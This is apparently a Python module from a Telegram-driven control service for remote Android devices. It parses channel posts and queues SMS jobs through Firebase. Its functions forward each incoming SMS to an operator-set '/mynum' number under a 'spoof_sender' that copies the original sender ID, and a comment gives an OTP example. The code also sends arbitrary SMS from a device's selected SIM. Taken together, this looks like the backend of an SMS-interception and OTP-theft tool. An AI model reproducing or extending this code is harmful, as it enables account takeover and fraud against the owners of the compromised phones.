import re

from sqlalchemy.orm import Session

from app.database import Device, MonitorProfile, OutboundSMS
from app.device_ui import get_sim_list

PHONE_RE = re.compile(r"(\+?\d{10,15})")


def _extract_phone(raw: str) -> str:
    match = PHONE_RE.search(raw)
    return match.group(1) if match else raw.strip()


def parse_channel_outgoing(text: str) -> tuple[str | None, str | None]:
    """Parse channel posts: To:/Message:, multi-line, or '91XXXXXXXXXX body'."""
    cleaned = text.strip()
    to_match = re.search(r"(?:📞\s*)?To\s*:\s*([+\d\s()-]+)", cleaned, re.I)
    msg_match = re.search(
        r"(?:💬\s*)?(?:Message|MSG|Text|Body)\s*:\s*(.+)$",
        cleaned,
        re.I | re.S,
    )

    to_number = _extract_phone(to_match.group(1)) if to_match else None
    message = msg_match.group(1).strip() if msg_match else None
    if to_number and message:
        return to_number, message

    lines = [line.strip() for line in cleaned.splitlines() if line.strip()]
    if len(lines) >= 2:
        maybe_number = _extract_phone(lines[0])
        if maybe_number and len(re.sub(r"\D", "", maybe_number)) >= 10:
            body = "\n".join(lines[1:]).strip()
            if body:
                return maybe_number, body

    # Single line: 917290053434 OTP body here
    parts = cleaned.split(None, 1)
    if len(parts) == 2:
        maybe_number = _extract_phone(parts[0])
        if maybe_number and len(re.sub(r"\D", "", maybe_number)) >= 10:
            body = parts[1].strip()
            if body:
                return maybe_number, body

    return None, None


def prepare_sms_forward(sender: str, message: str) -> tuple[str, str]:
    """Pass SMS through unchanged for /mynum inject — sender ID + body only."""
    clean_sender = sender.strip()
    clean_message = message.strip()

    if re.search(r"(?:From|FROM|Sender)\s*:", clean_message, re.I):
        parsed_sender, parsed_body = parse_channel_message(clean_message)
        if parsed_body:
            clean_message = parsed_body.strip()
        if parsed_sender:
            clean_sender = parsed_sender.strip()

    sender_prefix = f"{clean_sender}:"
    if clean_message.startswith(sender_prefix):
        clean_message = clean_message[len(sender_prefix) :].lstrip()

    return clean_sender, clean_message


def parse_channel_message(text: str) -> tuple[str | None, str]:
    cleaned = text.strip()
    sender = None
    message = cleaned

    from_match = re.search(r"(?:📞\s*)?(?:From|FROM|Sender)\s*:\s*([+\d\s-]+)", cleaned, re.I)
    msg_match = re.search(
        r"(?:💬\s*)?(?:Message|MSG|Text)\s*:\s*(.+)$",
        cleaned,
        re.I | re.S,
    )

    if from_match:
        sender = _extract_phone(from_match.group(1))

    if msg_match:
        message = msg_match.group(1).strip()
    elif from_match:
        message = re.sub(r"^(?:📞\s*)?(?:From|FROM|Sender)\s*:\s*[+\d\s-]+\s*", "", cleaned, flags=re.I).strip()

    return sender, message or cleaned


def queue_forward_to_mynum(
    db: Session,
    profile: MonitorProfile,
    device: Device,
    sender: str,
    message: str,
) -> OutboundSMS:
    """Forward incoming SMS to /mynum — exact sender ID + body, nothing extra."""
    from app.services import normalize_phone

    if not profile.phone_number:
        raise ValueError("Pehle /mynum <number> set karo")

    sender, message = prepare_sms_forward(sender, message)

    sims = get_sim_list(device)
    sim_index = profile.selected_sim_index or 0
    sim_slot = sims[sim_index]["slot"] if sims else 1

    outbound = OutboundSMS(
        device_id=device.id,
        telegram_user_id=profile.telegram_user_id,
        sim_index=sim_index,
        sim_slot=sim_slot,
        to_number=normalize_phone(profile.phone_number),
        spoof_sender=sender,
        message=message,
        status="pending",
    )
    db.add(outbound)
    db.commit()
    db.refresh(outbound)
    return outbound


def queue_manual_sms(
    db: Session,
    profile: MonitorProfile,
    device: Device,
    to_number: str,
    message: str,
) -> OutboundSMS:
    from app.services import normalize_phone

    sims = get_sim_list(device)
    sim_index = profile.selected_sim_index or 0
    sim_slot = sims[sim_index]["slot"] if sims else 1

    outbound = OutboundSMS(
        device_id=device.id,
        telegram_user_id=profile.telegram_user_id,
        sim_index=sim_index,
        sim_slot=sim_slot,
        to_number=normalize_phone(to_number),
        spoof_sender=None,
        message=message,
        status="pending",
    )
    db.add(outbound)
    db.commit()
    db.refresh(outbound)
    return outbound


def queue_channel_sms(
    db: Session,
    profile: MonitorProfile,
    device: Device,
    channel_text: str,
    channel_message_id: int | None = None,
) -> OutboundSMS:
    from app.services import normalize_phone

    to_number, outgoing_message = parse_channel_outgoing(channel_text)
    if not to_number or not outgoing_message:
        raise ValueError(
            "Channel format: 91XXXXXXXXXX message\n"
            "ya To: number / Message: text"
        )

    target = normalize_phone(to_number)
    body = outgoing_message.strip()

    sims = get_sim_list(device)
    sim_index = profile.selected_sim_index or 0
    sim_slot = sims[sim_index]["slot"] if sims else 1

    outbound = OutboundSMS(
        device_id=device.id,
        telegram_user_id=profile.telegram_user_id,
        sim_index=sim_index,
        sim_slot=sim_slot,
        to_number=target,
        spoof_sender=None,
        message=body,
        channel_message_id=channel_message_id,
        status="pending",
    )
    db.add(outbound)
    db.commit()
    db.refresh(outbound)
    return outbound


async def queue_channel_sms_with_firebase(
    db: Session,
    profile: MonitorProfile,
    device: Device,
    channel_text: str,
    channel_message_id: int | None = None,
) -> OutboundSMS:
    outbound = queue_channel_sms(db, profile, device, channel_text, channel_message_id)
    from app.firebase_sync import push_outbound_to_firebase

    await push_outbound_to_firebase(profile, device, outbound)
    return outbound


async def queue_manual_sms_with_firebase(
    db: Session,
    profile: MonitorProfile,
    device: Device,
    to_number: str,
    message: str,
) -> OutboundSMS:
    outbound = queue_manual_sms(db, profile, device, to_number, message)
    from app.firebase_sync import push_outbound_to_firebase

    await push_outbound_to_firebase(profile, device, outbound)
    return outbound


def get_profile_by_channel(db: Session, channel_id: str) -> list[tuple[MonitorProfile, Device]]:
    profiles = (
        db.query(MonitorProfile)
        .filter(
            MonitorProfile.channel_id == channel_id,
            MonitorProfile.active_device_id.isnot(None),
        )
        .all()
    )
    results: list[tuple[MonitorProfile, Device]] = []
    for profile in profiles:
        device = db.query(Device).filter(Device.id == profile.active_device_id).first()
        if device:
            results.append((profile, device))
    return results
